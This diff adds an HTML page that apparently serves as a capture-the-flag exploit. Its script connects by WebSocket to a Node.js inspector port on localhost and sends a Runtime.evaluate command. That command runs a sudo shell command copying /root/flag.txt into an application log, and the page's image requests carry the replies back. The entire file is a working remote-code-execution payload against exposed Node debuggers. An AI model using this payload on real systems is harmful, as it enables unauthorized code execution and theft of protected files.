@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        let ws = new WebSocket("ws://127.0.0.1:9229/bff792d1-3b2c-4d2a-812a-d95a7f158f2c");
+        ws.onmessage = function(data){new Image().src = '/message?' + data.data;}
+        ws.onerror = function(data){new Image().src = '/error?' + data;}
+        ws.onopen = () => {
+            ws.send(
+              JSON.stringify({
+                id: 1,
+                method: "Runtime.evaluate",
+                params: {
+                  expression:
+                    'require(\'child_process\').execSync(\'sudo /bin/cat /root/flag.txt >> /home/ubuntu/app-logs.out\')',
+                },
+              })
+            );
+        };
+    </script>
+</body>
+</html>
